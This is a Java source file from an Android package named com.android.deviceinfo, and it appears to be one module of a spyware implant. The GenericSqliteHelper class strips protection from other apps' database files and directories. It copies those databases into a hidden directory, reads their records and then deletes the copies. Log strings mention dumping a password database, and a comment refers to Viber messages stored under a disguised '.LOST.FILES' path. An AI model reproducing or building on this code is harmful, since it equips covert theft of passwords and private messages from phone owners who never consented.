package com.android.deviceinfo.db;

import java.io.File;
import java.io.IOException;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.deviceinfo.Messages;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.Utils;

/**
 * Helper to access sqlite db.
 * 
 * @author zeno
 * @param <T>
 * 
 */
public class GenericSqliteHelper { // extends SQLiteOpenHelper {
	private static final String TAG = "GenericSqliteHelper";
	private static final int DB_VERSION = 4;
	public static Object lockObject = new Object();
	private String name = null;
	private SQLiteDatabase db;
	public boolean deleteAtEnd = false;

	private GenericSqliteHelper(String name, boolean deleteAtEnd) {
		this.name = name;
		this.deleteAtEnd = deleteAtEnd;
	}

	public GenericSqliteHelper(SQLiteDatabase db) {
		this.db = db;

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper open(String dbFile) {
		File fs = new File(dbFile);
		return open(fs);
	}

	public static GenericSqliteHelper open(String databasePath, String dbfile) {
		File fs = new File(databasePath, dbfile);
		return open(fs);
	}

	private static GenericSqliteHelper open(File fs) {
		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath())) {
			return new GenericSqliteHelper(fs.getAbsolutePath(), false);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
			}
			return null;
		}

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String dbFile) {

		File fs = new File(dbFile);

		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath()) && fs.canRead()) {
			// if(Path.unprotect(fs.getParent()) &&
			// Path.unprotect(fs.getAbsolutePath()))
			dbFile = fs.getAbsolutePath();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
			}
			return null;
		}

		String localFile = Path.markup() + fs.getName();
		try {
			Utils.copy(new File(dbFile), new File(localFile));
		} catch (IOException e) {
			return null;
		}

		return new GenericSqliteHelper(localFile, true);

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param pathSystem
	 * @param file
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String pathSystem, String file) {
		return openCopy(new File(pathSystem, file).getAbsolutePath());
	}

	/*
	 * @Override public void onCreate(SQLiteDatabase db) { }
	 * 
	 * @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int
	 * newVersion) { if (Cfg.DEBUG) { Check.log(TAG + " (onUpgrade), old: " +
	 * oldVersion); } }
	 */

	public long traverseRawQuery(String sqlquery, String[] selectionArgs, RecordVisitor visitor) {
		synchronized (lockObject) {
			db = getReadableDatabase();
			Cursor cursor = db.rawQuery(sqlquery, selectionArgs);

			long ret = traverse(cursor, visitor, new String[] {});

			cursor.close();
			cursor = null;

			if (this.db != null) {
				db.close();
				db = null;
			}
			return ret;
		}
	}

	/**
	 * Traverse all the records of a table on a projection. Visitor pattern
	 * implementation
	 * 
	 * @param table
	 * @param projection
	 * @param selection
	 * @param visitor
	 */
	public long traverseRecords(String table, RecordVisitor visitor) {
		synchronized (lockObject) {
			db = getReadableDatabase();
			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();

			queryBuilderIndex.setTables(table);
			Cursor cursor = queryBuilderIndex.query(db, visitor.getProjection(), visitor.getSelection(), null, null,
					null, visitor.getOrder());

			long ret = traverse(cursor, visitor, new String[] { table });

			cursor.close();
			cursor = null;

			if (this.db != null) {
				db.close();
				db = null;
			}
			return ret;
		}
	}

	private long traverse(Cursor cursor, RecordVisitor visitor, String[] tables) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (traverseRecords)");
		}
		visitor.init(tables, cursor.getCount());

		long maxid = 0;
		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext() && !visitor.isStopRequested()) {
			long id = visitor.cursor(cursor);
			maxid = Math.max(id, maxid);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (traverseRecords) maxid: " + maxid);
		}

		visitor.close();

		if (this.deleteAtEnd) {
			File file = new File(this.name);
			file.delete();
		}

		return maxid;

	}

	public SQLiteDatabase getReadableDatabase() {
		if (db != null && db.isOpen()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) already opened");
			}
			return db;
		}
		try {
			Path.unprotect(name, 3, true);
			Path.unprotect(name + "*", true);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) open");
			}
			// TODO: verificare se sia possibile evitare i log:
			// 06-17 11:13:17.726: E/SqliteDatabaseCpp(10522):
			// sqlite3_open_v2("/mnt/sdcard/.LOST.FILES/mdd/viber_messages",
			// &handle, 1, NULL) failed
			// 06-17 11:13:17.742: E/SQLiteDatabase(10522): Failed to open the
			// database. closing it.
			// 06-17 11:13:17.742: E/SQLiteDatabase(10522):
			// android.database.sqlite.SQLiteCantOpenDatabaseException: unable
			// to open database file

			AutoFile file = new AutoFile(name);
			if (file.exists()) {
				SQLiteDatabase opened = SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
						| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
				return opened;
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getReadableDatabase) Error: file does not exists");
				}
			}
		} catch (Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) Error: " + ex);
			}
		}
		
		return null;
	}

	public void deleteDb() {

		File file = new File(this.name);
		file.delete();

	}

}